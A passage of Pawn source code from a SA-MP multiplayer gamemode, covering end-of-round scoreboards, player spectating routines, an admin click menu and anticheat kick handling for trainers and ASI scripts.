	iString = "~l~Name\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t K\t\t\tD\t\t\tP\t\t\tAcc\t\t\tDmg";
	TextDrawSetString(rightText, iString);

	new
	    playerScores[MAX_PLAYERS][rankingEnum],
	    index,
	    p,
	    names[MAX_PLAYERS][MAX_PLAYER_NAME]
	;


	foreach(new i : Player) {
		if(Player[i][TotalDamage] > 0) {
			playerScores[index][player_Score] = floatround(Player[i][TotalDamage], floatround_round);
			playerScores[index][player_Team] = Player[i][Team];
			playerScores[index][player_Kills] = Player[i][TotalKills];
			playerScores[index][player_Deaths] = Player[i][TotalDeaths];
			playerScores[index][player_TPlayed] = Player[i][RoundPlayed];
			playerScores[index][player_HP] = floatround(Player[i][pHealth] + Player[i][pArmour], floatround_round);

			new Float:nTotalAccuracy;
			if(Player[i][TotalBulletsFired] == 0) nTotalAccuracy = 0.0;
			else nTotalAccuracy = floatmul(100.0, floatdiv(Player[i][TotalshotsHit], Player[i][TotalBulletsFired]));
			playerScores[index][player_Acc] = floatround(nTotalAccuracy, floatround_round);

			format(names[index], MAX_PLAYER_NAME, Player[i][NameWithoutTag]);

		    playerScores[index++][player_ID] = i;
		    p++;
		}
		if(Player[i][Spectating] == true) StopSpectate(i);

		if(Player[i][InDuel] == false) ShowEndRoundTextDraw(i);
		if(Player[i][InDuel] == false) SetPlayerVirtualWorld(i, i);

	}
	for(new i=0; i < SAVE_SLOTS; ++i) {
		if(strlen(SaveVariables[i][pName]) > 2 && SaveVariables[i][TDamage] > 0) {
	    	playerScores[index][player_Score] = floatround(SaveVariables[i][TDamage], floatround_round);
	    	playerScores[index][player_Team] = SaveVariables[i][pTeam];
	    	playerScores[index][player_Kills] = SaveVariables[i][TKills];
	    	playerScores[index][player_Deaths] = SaveVariables[i][TDeaths];
	    	playerScores[index][player_TPlayed] = SaveVariables[i][TPlayed];
	    	playerScores[index][player_HP] = floatround(SaveVariables[i][gHealth] + SaveVariables[i][gArmour], floatround_round);

			new Float:nTotalAccuracy;
			if(SaveVariables[i][tBulletsShot] == 0) nTotalAccuracy = 0.0;
			else nTotalAccuracy = floatmul(100.0, floatdiv(SaveVariables[i][tshotsHit], SaveVariables[i][tBulletsShot]));
			playerScores[index][player_Acc] = floatround(nTotalAccuracy, floatround_round);

	    	format(names[index], MAX_PLAYER_NAME, SaveVariables[i][pNameWithoutTag]);

	   	    SaveVariables[i][RKills]   	=  	0;
			SaveVariables[i][RDeaths]  	= 	0;
			SaveVariables[i][RDamage] 	= 	0;

			SaveVariables[i][RoundID]   =   -1;
			index++;
			p++;
		}
	}

	GetPlayerHighestScores2(playerScores, names, 0, index-1);

//	new AttList[256], AttKills[180], AttDeaths[180], AttDamage[180], DefList[256], DefKills[180], DefDeaths[180], DefDamage[180];

	new topkill, topkillID = -1,
		Float: topDmg, topDmgID = -1,
		topAcc, topAccID = -1
	;

	for(new i = 0; i != p; ++i) {

		if( playerScores[i][player_Kills] > topkill && playerScores[i][player_Kills] > 0 )
	    {
            topkill = playerScores[i][player_Kills];
            topkillID = i;
	    }
	    if( playerScores[i][player_Score] > topDmg && playerScores[i][player_Score] > 0  )
	    {
            topDmg = playerScores[i][player_Score];
            topDmgID = i;
	    }
	    if( playerScores[i][player_Acc] > topAcc && playerScores[i][player_Acc] > 0  )
	    {
            topAcc = playerScores[i][player_Acc];
            topAccID = i;
	    }

	    if(playerScores[i][player_Team] == ATTACKER || playerScores[i][player_Team] == ATTACKER_SUB) {
	        format(AttList, sizeof(AttList), "%s~w~%s~n~", AttList, names[i]);
		    format(AttKills, sizeof(AttKills), "%s~w~%d~n~", AttKills, playerScores[i][player_Kills]);
	        format(AttDeaths, sizeof(AttDeaths), "%s~w~%d~n~", AttDeaths, playerScores[i][player_Deaths]);
	        format(AttPlayed, sizeof(AttPlayed), "%s~w~%d~n~", AttPlayed, playerScores[i][player_TPlayed]);
	        format(AttDamage, sizeof(AttDamage), "%s~w~%d~n~", AttDamage, playerScores[i][player_Score]);
	        format(AttAcc, sizeof(AttAcc), "%s~w~%d%%~n~", AttAcc, playerScores[i][player_Acc]);


		} else if(playerScores[i][player_Team] == DEFENDER || playerScores[i][player_Team] == DEFENDER_SUB) {
	        format(DefList, sizeof(DefList), "%s~w~%s~n~", DefList, names[i]);
	        format(DefKills, sizeof(DefKills), "%s~w~%d~n~", DefKills, playerScores[i][player_Kills]);
	        format(DefDeaths, sizeof(DefDeaths), "%s~w~%d~n~", DefDeaths, playerScores[i][player_Deaths]);
	        format(DefPlayed, sizeof(DefPlayed), "%s~w~%d~n~", DefPlayed, playerScores[i][player_TPlayed]);
	        format(DefDamage, sizeof(DefDamage), "%s~w~%d~n~", DefDamage, playerScores[i][player_Score]);
	        format(DefAcc, sizeof(DefAcc), "%s~w~%d%%~n~", DefAcc, playerScores[i][player_Acc]);



		}
		if(i == 0) format(TopString[0], 128, "%s1st         -         %s   	({FFFFFF}%d%s)", TextColor[playerScores[i][player_Team]], names[i], playerScores[i][player_Score], TextColor[playerScores[i][player_Team]]);
		else if(i == 1) format(TopString[1], 128, "%s2nd         -         %s   	({FFFFFF}%d%s)", TextColor[playerScores[i][player_Team]], names[i], playerScores[i][player_Score], TextColor[playerScores[i][player_Team]]);
		else if(i == 2) format(TopString[2], 128, "%s3rd         -         %s   	({FFFFFF}%d%s)", TextColor[playerScores[i][player_Team]], names[i], playerScores[i][player_Score], TextColor[playerScores[i][player_Team]]);



	}


	iString = "";

	if( topAccID >= 0 ) format( iString, sizeof(iString) , "~w~~h~Most Kills: %s~h~~h~%s ~w~~h~%d_____", TDC[playerScores[topkillID][player_Team]], names[topkillID] , topkill  );
	else format( iString, sizeof(iString) , "~w~~h~Most Kills: None_____" );
	if( topDmgID >= 0 ) format( iString, sizeof(iString) , "%s~w~~h~Most Dmg: %s~h~~h~%s ~w~~h~%.0f_____", iString, TDC[playerScores[topDmgID][player_Team]], names[topDmgID] , topDmg  );
	else format( iString, sizeof(iString) , "%s~w~~h~Most Dmg: None_____", iString );
    if( topAccID >= 0 ) format( iString, sizeof(iString) , "%s~w~~h~Top Acc: %s~h~~h~%s ~w~~h~%d%%", iString, TDC[playerScores[topAccID][player_Team]], names[topAccID] , topAcc  );
	else format( iString, sizeof(iString) , "%s~w~~h~Top Acc: None", iString );
	TextDrawSetString( leftTop, iString );

/* // ROUND_REMOVED
	TextDrawSetString(EN_AttackerList, AttList);
	TextDrawSetString(EN_TAttackerKills, AttKills);
	TextDrawSetString(EN_TAttackerDeaths, AttDeaths);
	TextDrawSetString(EN_TAttackerRoundsPlayed, AttPlayed);
	TextDrawSetString(EN_TAttackerAccuracy, AttAcc);
	TextDrawSetString(EN_TAttackerDamage, AttDamage);


	TextDrawSetString(EN_DefenderList, DefList);
	TextDrawSetString(EN_TDefenderKills, DefKills);
	TextDrawSetString(EN_TDefenderDeaths, DefDeaths);
	TextDrawSetString(EN_TDefenderRoundsPlayed, DefPlayed);
	TextDrawSetString(EN_TDefenderAccuracy, DefAcc);
	TextDrawSetString(EN_TDefenderDamage, DefDamage);
*/
//
	TextDrawSetString(leftPlayed, AttPlayed );

	TextDrawSetString(leftNames, AttList);
	TextDrawSetString(leftKills, AttKills);
	//TextDrawSetString(leftHP, AttDeaths);
	TextDrawSetString(leftDeaths, AttDeaths);
	TextDrawSetString(leftAcc, AttAcc);
	TextDrawSetString(leftDmg, AttDamage);

	TextDrawSetString(rightNames, DefList);
	TextDrawSetString(rightKills, DefKills);
	//TextDrawSetString(rightHP, DefDeaths);
	TextDrawSetString(rightDeaths, DefDeaths);
	TextDrawSetString(rightAcc, DefAcc);
	TextDrawSetString(rightDmg, DefDamage);

	TextDrawSetString(rightPlayed, DefPlayed );
//



	SendClientMessageToAll(-1, " ");
	SendClientMessageToAll(-1, " ");
	SendClientMessageToAll(-1, " ");
	SendClientMessageToAll(-1, " ");
    SendClientMessageToAll(-1, " ");
	SendClientMessageToAll(-1, " ");
	SendClientMessageToAll(-1, "{FFFFFF}---------------------------------------------------------------");
//	SendClientMessageToAll(-1, "\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t{FFFFFF}Top Players");
    SendClientMessageToAll(-1, "{FFFFFF}Top Stooopids:");
	SendClientMessageToAll(-1, TopString[0]);
	SendClientMessageToAll(-1, TopString[1]);
	SendClientMessageToAll(-1, TopString[2]);
//	SendClientMessageToAll(-1, " ");
	SendClientMessageToAll(-1, "{FFFFFF}---------------------------------------------------------------");


    SetWeaponStatsString();

	TeamName[ATTACKER] = "Alpha";
	TeamName[ATTACKER_SUB] = "Alpha Sub";
	TeamName[DEFENDER] = "Beta";
	TeamName[DEFENDER_SUB] = "Beta Sub";

    TeamScore[ATTACKER] = 0;
    TeamScore[DEFENDER] = 0;

	format(iString, sizeof(iString), "~r~%s %s(~r~%d%s)  ~b~~h~%s %s(~b~~h~%d%s)",TeamName[ATTACKER],MAIN_TEXT_COLOUR,TeamScore[ATTACKER],MAIN_TEXT_COLOUR,TeamName[DEFENDER],MAIN_TEXT_COLOUR,TeamScore[DEFENDER],MAIN_TEXT_COLOUR);
    TextDrawSetString(TeamScoreText, iString);


	foreach(new i : Player)
	{
	    //for(new j = 0; j < 55; j ++)
		//	Player[i][WeaponStat][j] = 0;
		Player[i][TotalKills] = 0;
		Player[i][TotalDeaths] = 0;
		Player[i][TotalDamage] = 0;
		Player[i][RoundPlayed] = 0;
	    Player[i][TotalBulletsFired] = 0;
	    Player[i][TotalshotsHit] = 0;
	}

	ClearPlayerVariables();

	AttList = "";
	AttKills = "";
	AttDeaths = "";
	AttPlayed = "";
	AttAcc = "";
	AttDamage = "";

	DefList = "";
	DefKills = "";
	DefDeaths = "";
	DefPlayed = "";
	DefAcc = "";
	DefDamage = "";

	#if ANTICHEAT == 1
	AntiCheat = false;
	TextDrawHideForAll(ACText);
	new newhostname[128];
	format(newhostname, sizeof(newhostname), "hostname %s", hostname);
	SendRconCommand(newhostname);

	KillTimer(ACTimer);
    AC_Toggle(false);
    PermAC = false;
	#endif
	return 1;
}

SpectatePlayer(playerid, specid) {
	if(Player[playerid][InDM] == true) {
	    Player[playerid][InDM] = false;
    	Player[playerid][DMReadd] = 0;
	}
	Player[playerid][AntiLag] = false;
	HideTargetInfo(playerid);

	new OldSpecID = -1;

	if(Player[playerid][BeingSpeced] == true) {
		foreach(new i : Player) {
		    if(Player[i][Spectating] == true && Player[i][IsSpectatingID] == playerid) {
				StopSpectate(i);
			}
		}
	} else if (Player[playerid][Spectating] == true && specid != Player[playerid][IsSpectatingID]) {
	    OldSpecID = Player[playerid][IsSpectatingID];
	}



	//if(TeamHPDamage == false)
	//{
	// spectation info tds
	new iString[256],Float:aArmour, Float:aHealth;
	GetHP(specid, aHealth);
	GetAP(specid, aArmour);

	format(iString, sizeof(iString),"%s%s ~r~~h~%d~n~~n~%s(%.0f) (~r~~h~%.0f%s)~n~FPS: ~r~~h~%d %sPing: ~r~~h~%d~n~%sPacket-Loss: ~r~~h~%.1f~n~%sKills: ~r~~h~%d~n~%sDamage: ~r~~h~%.0f~n~%sTotal Dmg: ~r~~h~%.0f",
		MAIN_TEXT_COLOUR, Player[specid][Name], specid, MAIN_TEXT_COLOUR, Player[specid][pArmour], Player[specid][pHealth], MAIN_TEXT_COLOUR, GetPlayerFPS(specid), MAIN_TEXT_COLOUR, GetPlayerPing(specid), MAIN_TEXT_COLOUR, GetPlayerPacketLoss(specid), MAIN_TEXT_COLOUR, Player[specid][RoundKills], MAIN_TEXT_COLOUR, Player[specid][RoundDamage], MAIN_TEXT_COLOUR, Player[specid][TotalDamage]);
	PlayerTextDrawSetString(playerid, SpecText[1], iString);
	PlayerTextDrawSetString(playerid, SpecText[3], SpecWeapons(specid));

 	for(new i; i < 4; i++) {
		PlayerTextDrawShow(playerid, SpecText[i]);
	}
	if(Player[playerid][Team] == ATTACKER || Player[playerid][Team] == ATTACKER_SUB)
	{
		TextDrawShowForPlayer(playerid, DefenderTeam[2]);
		TextDrawShowForPlayer(playerid, DefenderTeam[3]);
		TextDrawShowForPlayer(playerid, AttackerTeam[0]);
		TextDrawShowForPlayer(playerid, AttackerTeam[1]);
	}
	else if(Player[playerid][Team] == DEFENDER || Player[playerid][Team] == DEFENDER_SUB)
	{
		TextDrawShowForPlayer(playerid, AttackerTeam[2]);
		TextDrawShowForPlayer(playerid, AttackerTeam[3]);
		TextDrawShowForPlayer(playerid, DefenderTeam[0]);
		TextDrawShowForPlayer(playerid, DefenderTeam[1]);
	}

	
	Player[playerid][IsSpectatingID] = specid;
	Player[playerid][Spectating] = true;
	Player[specid][BeingSpeced] = true;

	PlayerTextDrawHide(playerid, RoundKillDmgTDmg);
	PlayerTextDrawHide(playerid, ArmourTextDraw);
	PlayerTextDrawHide(playerid, HPTextDraw_TD);
	HidePlayerProgressBar(playerid, HealthBar);
	HidePlayerProgressBar(playerid, ArmourBar);


	SetPlayerVirtualWorld(playerid, GetPlayerVirtualWorld(specid));
	SetPlayerInterior(playerid, GetPlayerInterior(specid));

    TogglePlayerSpectating(playerid, 1);

	if(IsPlayerInAnyVehicle(specid)) {
	    PlayerSpectateVehicle(playerid, GetPlayerVehicleID(specid));
	} else {
		PlayerSpectatePlayer(playerid, specid);
	}

 	if(Player[specid][Playing] == true && GameType == 0 && Current != -1) {
	    SetPlayerCheckpoint(playerid, BCPSpawn[Current][0], BCPSpawn[Current][1], BCPSpawn[Current][2],2);
	}


	new WhoSpecing[2][256], SpecingMe;
	format(WhoSpecing[0], 100, "%sSPECTATOR~n~~n~", MAIN_TEXT_COLOUR);

	if(OldSpecID != -1) {
	    foreach(new i : Player) {
	        if(Player[i][Spectating] == true && Player[i][IsSpectatingID] == OldSpecID) {
				SpecingMe++;

				if(SpecingMe <= 6) {
		        	format(WhoSpecing[0], 256, "%s%s%s ~r~~h~%d~n~", WhoSpecing[0], MAIN_TEXT_COLOUR, Player[i][NameWithoutTag], i);
				} else if (SpecingMe <= 12) {
				    format(WhoSpecing[1], 256, "%s%s%s ~r~~h~%d~n~", WhoSpecing[1], MAIN_TEXT_COLOUR, Player[i][NameWithoutTag], i);
				}
			}
		}
		if(SpecingMe > 0) {
			PlayerTextDrawSetString(OldSpecID, WhoSpec[0], WhoSpecing[0]);
			PlayerTextDrawSetString(OldSpecID, WhoSpec[1], WhoSpecing[1]);

			foreach(new i : Player) {
			    if(Player[i][Spectating] == true && Player[i][IsSpectatingID] == OldSpecID && i != OldSpecID) {
					PlayerTextDrawSetString(i, WhoSpec[0], WhoSpecing[0]);
					PlayerTextDrawSetString(i, WhoSpec[1], WhoSpecing[1]);
				}
			}
		} else {
			PlayerTextDrawSetString(OldSpecID, WhoSpec[0], " ");
			PlayerTextDrawSetString(OldSpecID, WhoSpec[1], " ");
			Player[OldSpecID][BeingSpeced] = false;
		}
	}

	SpecingMe = 0;
    format(WhoSpecing[0], 100, "%sSPECTATOR~n~~n~", MAIN_TEXT_COLOUR);
    WhoSpecing[1] = "";

	foreach(new i : Player) {
	    if(Player[i][Spectating] == true && Player[i][IsSpectatingID] == specid) {
			SpecingMe++;

			if(SpecingMe <= 5) {
	        	format(WhoSpecing[0], 256, "%s%s%s ~r~~h~%d~n~", WhoSpecing[0], MAIN_TEXT_COLOUR, Player[i][NameWithoutTag], i);
			} else if (SpecingMe <= 10) {
			    format(WhoSpecing[1], 256, "%s%s%s ~r~~h~%d~n~", WhoSpecing[1], MAIN_TEXT_COLOUR, Player[i][NameWithoutTag], i);
			}
		}
	}
	if(SpecingMe > 0) {
		PlayerTextDrawSetString(specid, WhoSpec[0], WhoSpecing[0]);
		PlayerTextDrawSetString(specid, WhoSpec[1], WhoSpecing[1]);

		foreach(new i : Player) {
		    if(Player[i][Spectating] == true && Player[i][IsSpectatingID] == specid && i != specid) {
				PlayerTextDrawSetString(i, WhoSpec[0], WhoSpecing[0]);
				PlayerTextDrawSetString(i, WhoSpec[1], WhoSpecing[1]);
			}
		}
	} else {
		PlayerTextDrawSetString(specid, WhoSpec[0], " ");
		PlayerTextDrawSetString(specid, WhoSpec[1], " ");
		Player[specid][BeingSpeced] = false;
	}


	SetPlayerVirtualWorld(playerid, GetPlayerVirtualWorld(specid));
	SetPlayerInterior(playerid, GetPlayerInterior(specid));

    TogglePlayerSpectating(playerid, 1);

	if(IsPlayerInAnyVehicle(specid)) {
	    PlayerSpectateVehicle(playerid, GetPlayerVehicleID(specid));
	} else {
		PlayerSpectatePlayer(playerid, specid);
	}

 	if(Player[specid][Playing] == true && GameType == 0 && Current != -1) {
	    SetPlayerCheckpoint(playerid, BCPSpawn[Current][0], BCPSpawn[Current][1], BCPSpawn[Current][2],2);
	}

	RadarFix();
    return 1;
}

StopSpectate(playerid)
{
	if(Player[playerid][SpectatingRound] != -1)
	{
	    Player[playerid][SpectatingRound] = -1;
	    PlayerTextDrawSetString(playerid, TD_RoundSpec, "_");
	    Player[playerid][Spectating] = false;
		SetSpawnInfoEx(playerid, GetPlayerTeam(playerid), Skin[Player[playerid][Team]], MainSpawn[0]+random(5),MainSpawn[1]+random(5),MainSpawn[2]+2, MainSpawn[3], 0, 0, 0, 0, 0, 0);
		SetPlayerInterior(playerid,MainInterior);
		Player[playerid][IgnoreSpawn] = true;
		SpawnPlayerEx(playerid);
		return 1;
	}

 	if(Player[playerid][BeingSpeced] == true)
	{
		foreach(new i : Player)
		{
		    if(i == playerid) // this not being here caused a stupid error on crashdetect "stack heap size"
		        continue;
		        
			if(Player[i][Spectating] == true && Player[i][IsSpectatingID] == playerid) {
			    StopSpectate(i);
			}
		}
	}

	new specid = Player[playerid][IsSpectatingID];

	CancelFlyMode(playerid);

	Player[playerid][Spectating] = false;
	Player[playerid][IsSpectatingID] = -1;
	Player[playerid][BeingSpeced] = false;
	
	for(new i; i < 4; i++) {
		PlayerTextDrawHide(playerid, SpecText[i]);
	}

	TextDrawHideForPlayer(playerid, AttackerTeam[2]);
	TextDrawHideForPlayer(playerid, AttackerTeam[3]);
	TextDrawHideForPlayer(playerid, DefenderTeam[2]);
	TextDrawHideForPlayer(playerid, DefenderTeam[3]);

	PlayerTextDrawSetString(playerid, WhoSpec[0], " ");
	PlayerTextDrawSetString(playerid, WhoSpec[1], " ");

	PlayerTextDrawShow(playerid, RoundKillDmgTDmg);
	PlayerTextDrawShow(playerid, ArmourTextDraw);
	PlayerTextDrawShow(playerid, HPTextDraw_TD);
	ShowPlayerProgressBar(playerid, HealthBar);
	ShowPlayerProgressBar(playerid, ArmourBar);

    TogglePlayerSpectating(playerid, 0);

	SetPlayerPos(playerid, MainSpawn[0]+random(5), MainSpawn[1]+random(5), MainSpawn[2]+2);
	SetPlayerFacingAngle(playerid, MainSpawn[3]);
	SetPlayerInterior(playerid, MainInterior);
	SetPlayerVirtualWorld(playerid, 0);
	SetCameraBehindPlayer(playerid);


	if(specid != -1) {
		new WhoSpecing[2][254], SpecingMe = 0;
	    format(WhoSpecing[0], 100, "%sSPECTATOR~n~~n~", MAIN_TEXT_COLOUR);

		foreach(new i : Player) {
		    if(Player[i][Spectating] == true && Player[i][IsSpectatingID] == specid) {
				SpecingMe++;

				if(SpecingMe <= 5) {
		        	format(WhoSpecing[0], 256, "%s%s%s ~r~~h~%d~n~", WhoSpecing[0], MAIN_TEXT_COLOUR, Player[i][NameWithoutTag], i);
				} else if (SpecingMe <= 10) {
				    format(WhoSpecing[1], 256, "%s%s%s ~r~~h~%d~n~", WhoSpecing[1], MAIN_TEXT_COLOUR, Player[i][NameWithoutTag], i);
				}
			}
		}
		if(SpecingMe > 0) {
			PlayerTextDrawSetString(specid, WhoSpec[0], WhoSpecing[0]);
			PlayerTextDrawSetString(specid, WhoSpec[1], WhoSpecing[1]);

			foreach(new i : Player) {
			    if(Player[i][Spectating] == true && Player[i][IsSpectatingID] == specid && i != specid) {
					PlayerTextDrawSetString(i, WhoSpec[0], WhoSpecing[0]);
					PlayerTextDrawSetString(i, WhoSpec[1], WhoSpecing[1]);
				}
			}
		} else {
			PlayerTextDrawSetString(specid, WhoSpec[0], " ");
			PlayerTextDrawSetString(specid, WhoSpec[1], " ");
			Player[specid][BeingSpeced] = false;
		}
	}

	return 1;
}

stock SpectateNextTeamPlayer(playerid){
	new PAvailable = 0;

	foreach(new i : Player) {
	    if(Player[playerid][Team] == ATTACKER || Player[playerid][Team] == ATTACKER_SUB) {
	        if(Player[i][Team] == ATTACKER && i != playerid && Player[i][Playing] == true) PAvailable++;
		} else if(Player[playerid][Team] == DEFENDER || Player[playerid][Team] == DEFENDER_SUB) {
		    if(Player[i][Team] == DEFENDER && i != playerid && Player[i][Playing] == true) PAvailable++;
		}
	}

	if(PAvailable < 2 && Player[playerid][CalledByPlayer] == true){
		Player[playerid][CalledByPlayer] = false;
  		return 1;
	} else if(PAvailable < 1) {
	    StopSpectate(playerid);
		return 1;
	} else {
        Player[playerid][CalledByPlayer] = false;
	    new searching;
	    for(new i = Player[playerid][IsSpectatingID]+1; i <= HighestID+1; i++){
			if(searching > 1) {
				break;
			}
	    	if(i == HighestID+1) {
				i = 0;
	            searching++;
			}

			if(IsPlayerConnected(i) && i != playerid && Player[i][Playing] == true && Player[i][Team] != NON && GetPlayerState(i) != PLAYER_STATE_WASTED && IsTeamTheSame(Player[i][Team], Player[playerid][Team])) {
				SpectatePlayer(playerid, i);
			 	if(Player[i][Playing] == true && GameType == 0 && Current != -1) {
    				SetPlayerCheckpoint(playerid, BCPSpawn[Current][0], BCPSpawn[Current][1], BCPSpawn[Current][2],2);
				}
			 	break;
			}
		}
	}
	return 1;
}

stock SpectatePreviousTeamPlayer(playerid) {
	new PAvailable = 0;

	foreach(new i : Player) {
	    if(Player[playerid][Team] == ATTACKER || Player[playerid][Team] == ATTACKER_SUB) {
	        if(Player[i][Team] == ATTACKER && i != playerid && Player[i][Playing] == true) PAvailable++;
		} else if(Player[playerid][Team] == DEFENDER || Player[playerid][Team] == DEFENDER_SUB) {
		    if(Player[i][Team] == DEFENDER && i != playerid && Player[i][Playing] == true) PAvailable++;
		}
	}

	if(PAvailable < 2 && Player[playerid][CalledByPlayer] == true){
		Player[playerid][CalledByPlayer] = false;
  		return 1;
	} else if(PAvailable < 1) {
	    StopSpectate(playerid);
		return 1;
	} else {
        Player[playerid][CalledByPlayer] = false;
	    new searching;
		for(new i = Player[playerid][IsSpectatingID]-1; i >= -1; i--) {
			if(searching > 1) {
			    break;
			}
			if(i < 0) {
				i = HighestID+1;
	            searching++;
			}

			if(IsPlayerConnected(i) && i != playerid && Player[i][Spectating] == false && Player[i][Playing] == true && Player[i][Team] != NON && GetPlayerState(i) != PLAYER_STATE_WASTED && IsTeamTheSame(Player[i][Team], Player[playerid][Team])) {
				SpectatePlayer(playerid, i);
			 	if(Player[i][Playing] == true && GameType == 0 && Current != -1) {
    				SetPlayerCheckpoint(playerid, BCPSpawn[Current][0], BCPSpawn[Current][1], BCPSpawn[Current][2],2);
				}
				break;
			}
		}
	}
	return 1;
}

stock SpectateNextPlayer(playerid){
	new PAvailable = 0;

	foreach(new i : Player) {
	    if(Player[i][Team] != NON && Player[i][Spectating] == false) PAvailable++;
	}

	if(PAvailable < 2 && Player[playerid][CalledByPlayer] == true){
		Player[playerid][CalledByPlayer] = false;
  		return 1;
	} else if(PAvailable < 1) {
	    StopSpectate(playerid);
		return 1;
	} else {
        Player[playerid][CalledByPlayer] = false;
	    new searching;
	    for(new i = Player[playerid][IsSpectatingID]+1; i <= HighestID+1; i++){
			if(searching > 1) {
				break;
			}
	    	if(i == HighestID+1) {
				i = 0;
	            searching++;
			}

			if(IsPlayerConnected(i) && i != playerid && Player[i][Spectating] == false && Player[i][Team] != NON && GetPlayerState(i) != PLAYER_STATE_WASTED ) {
				SpectatePlayer(playerid, i);
			 	break;
			}
		}
	}
	return 1;
}

stock SpectatePreviousPlayer(playerid) {
	new PAvailable = 0;

	foreach(new i : Player){
	    if(Player[i][Team] != NON && Player[i][Spectating] == false) PAvailable++;
	}

	if(PAvailable < 2 && Player[playerid][CalledByPlayer] == true){
		Player[playerid][CalledByPlayer] = false;
  		return 1;
	} else if(PAvailable < 1) {
	    StopSpectate(playerid);
		return 1;
	} else {
        Player[playerid][CalledByPlayer] = false;
	    new searching;
		for(new i = Player[playerid][IsSpectatingID]-1; i >= -1; i--) {
			if(searching > 1) {
			    break;
			}
			if(i < 0) {
				i = HighestID+1;
	            searching++;
			}

        	if(IsPlayerConnected(i) && i != playerid && Player[i][Spectating] == false && Player[i][Team] != NON && GetPlayerState(i) != PLAYER_STATE_WASTED) {
				SpectatePlayer(playerid, i);
				break;
			}
		}
	}
	return 1;
}

public OnPlayerClickPlayer(playerid, clickedplayerid, source)
{
    ShowPlayerDialog(playerid, PLAYERCLICK_DIALOG, DIALOG_STYLE_LIST, sprintf("Clicked ID: %d", clickedplayerid), "Getinfo\nSpec\nAdd\nRemove\nReadd\nGunmenu\nGo\nGet\nSlap\nMute\nUnmute\nKick\nBan", "Select", "Cancel");
	LastClickedPlayer[playerid] = clickedplayerid;
	return 1;
}



#if ANTICHEAT == 1

public OnUsingAnotherPC(playerid)
{
    new str2[128], name[MAX_PLAYER_NAME];
	GetPlayerName(playerid, name, sizeof(name));
    format(str2, sizeof(str2), ""COL_PRIM"** Whitetiger's AC: {FFFFFF}%s"COL_PRIM" might be using the 2 PC trick.", name);
    SendClientMessageToAll(-1, str2);

    return 1;
}

public OnACUpdated(playerid) {

//    printf("OnACUpdated(%d): %d %d %d", playerid, AC_Running(playerid), AC_HasTrainer(playerid), AC_ASI(playerid));

    if(!IsPlayerConnected(playerid)) return 1;
	if(Player[playerid][IsGettingKicked] == true) return 1;
    if(AllowStartBase == false) return 1;

	new iString[400];

	if(!AC_Running(playerid)) {
	    if(Player[playerid][ACKick] >= 1) {
			format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has been kicked for not running the Anti-Cheat.", Player[playerid][Name]);
			SendClientMessageToAll(-1, iString);

			SendClientMessage(playerid, -1, "{FFFFFF}~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~");
		    SendClientMessage(playerid, -1, ""COL_PRIM"You can get the Anti-Cheat from: {FFFFFF}http://sixtytiger.com/tiger/ac_files/");
	        SendClientMessage(playerid, -1, "{FFFFFF}~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~");

	        Player[playerid][IsGettingKicked] = true;
			SetTimerEx("KickForAC", 1000, false, "i", playerid);

			iString = "";
			strcat(iString, "{FFFFFF}>>{FF3333}Anti-Cheat{FFFFFF}<<\n\nYou were kicked for not running the Whitetiger's Anti-Cheat.\n\nDownload Link: "COL_PRIM"http://sixtytiger.com/tiger/ac_files/");
			strcat(iString, "{FFFFFF}\n\nInstall and run the AC, wait for it to say \"You are ready to play now.\"\nMake sure it is up to date (Latest Version).");

			ShowPlayerDialog(playerid,DIALOG_ANTICHEAT,DIALOG_STYLE_MSGBOX,"{FF0000}Anti-Cheat", iString,"OK","");

			Player[playerid][ACKick] = 0;

	        printf("Player: %s (%d) has been kicked for not running the Anti-Cheat.", Player[playerid][Name], playerid);
		} else {
			Player[playerid][ACKick]++;

			format(iString,sizeof(iString),"{CCCCCC}AC is off %d/2", Player[playerid][ACKick]);
   			SendClientMessage(playerid, -1, iString);

   			format(iString, sizeof(iString), ""COL_PRIM"Warning: {FFFFFF}%s's"COL_PRIM" AC is off.", Player[playerid][Name]);
   			SendClientMessageToAll(-1, iString);
		}

		return 1;

	} else if(AC_HasTrainer(playerid)) {
		format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has been kicked for running trainers.", Player[playerid][Name]);
		SendClientMessageToAll(-1, iString);

        SendClientMessage(playerid, -1, "{FFFFFF}~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~");
		SendClientMessage(playerid, -1, ""COL_PRIM"If you are using {FFFFFF}AutoHotkey "COL_PRIM"please remove it.");
        SendClientMessage(playerid, -1, ""COL_PRIM"Once you're sure that you are using the original files, please {FFFFFF}RESTART "COL_PRIM"the Anti-Cheat.");
        SendClientMessage(playerid, -1, "{FFFFFF}~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~");

        Player[playerid][IsGettingKicked] = true;
		SetTimerEx("KickForAC", 1000, false, "i", playerid);

		printf("Player: %s (%d) has been kicked for running trainers.", Player[playerid][Name], playerid);

		return 1;

	} else if(AC_ASI(playerid)) {
		format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has been kicked for using .ASI scripts.", Player[playerid][Name]);
		SendClientMessageToAll(-1, iString);

        SendClientMessage(playerid, -1, "{FFFFFF}~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~");
        SendClientMessage(playerid, -1, ""COL_PRIM"Once you're sure that you are using the original files, please {FFFFFF}RESTART "COL_PRIM"the Anti-Cheat.");
        SendClientMessage(playerid, -1, "{FFFFFF}~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~");

        Player[playerid][IsGettingKicked] = true;
		SetTimerEx("KickForAC", 1000, false, "i", playerid);

        printf("Player: %s (%d) has been kicked for using .ASI", Player[playerid][Name], playerid);

		return 1;
	} else {
	    Player[playerid][ACKick] = 0;
	}

	return 1;
}

